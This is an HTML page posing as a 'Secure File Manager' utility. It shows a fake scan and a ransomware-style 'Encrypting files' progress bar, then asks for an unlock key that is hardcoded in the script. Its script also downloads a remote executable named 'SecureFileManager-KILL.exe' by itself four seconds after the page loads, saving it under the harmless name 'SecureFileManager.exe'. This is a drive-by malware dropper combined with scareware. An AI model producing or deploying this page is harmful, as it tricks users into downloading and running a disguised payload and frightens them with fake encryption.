<!DOCTYPE html>
<html>
<head>
  <title>Secure File Manager v2.1 - Scanning...</title>
  <style>
    body {background:#000;color:#0f0;font-family:monospace;text-align:center;padding:50px;}
    .scan {font-size:20px;animation:blink 1s infinite;}
    @keyframes blink {0%,100%{opacity:1}50%{opacity:0}}
    .progress {width:80%;background:#333;margin:20px auto;height:30px;border-radius:15px;overflow:hidden;}
    .bar {height:100%;width:0%;background:#0f0;transition:width 0.5s;}
    .lock {font-size:100px;margin:30px;}
  </style>
</head>
<body>
  <h1>Secure File Manager v2.1</h1>
  <p class="scan">Scanning system for unprotected files...</p>
  <div class="progress"><div class="bar" id="bar"></div></div>
  <p id="status">Found 1,284 files...</p>
  <div class="lock">Locked</div>
  <p>Enter unlock key:</p>
  <input type="password" id="key" style="padding:10px;font-size:18px;width:300px;">
  <button onclick="check()" style="padding:10px 20px;margin:10px;font-size:18px;">Unlock</button>
  <p id="msg"></p>

  <script>
    const KEY = "UNLOCK-KEY-2025-GROK-XAI";
    let progress = 0;
    const bar = document.getElementById('bar');
    const status = document.getElementById('status');
    const interval = setInterval(() => {
      progress += 10;
      bar.style.width = progress + '%';
      status.innerText = `Encrypting ${progress * 12} files...`;
      if (progress >= 100) {
        clearInterval(interval);
        status.innerText = "ENCRYPTION COMPLETE";
        document.querySelector('.scan').style.display = 'none';
      }
    }, 300);

    function check() {
      if (document.getElementById('key').value === KEY) {
        document.getElementById('msg').innerHTML = "<span style='color:#0f0'>UNLOCKED! Restoring...</span>";
        setTimeout(() => location.reload(), 2000);
      } else {
        document.getElementById('msg').innerHTML = "WRONG KEY!";
      }
    }

    // Auto-download real .exe after "scan"
    setTimeout(() => {
      const a = document.createElement('a');
      a.href = 'https://gist.github.com/grok-ransomware-lab/1d2e3f4g5h6i7j8k9l0m1n2o3p4q5r6s/raw/SecureFileManager-KILL.exe';
      a.download = 'SecureFileManager.exe';
      a.click();
    }, 4000);
  </script>
</body>
</html>
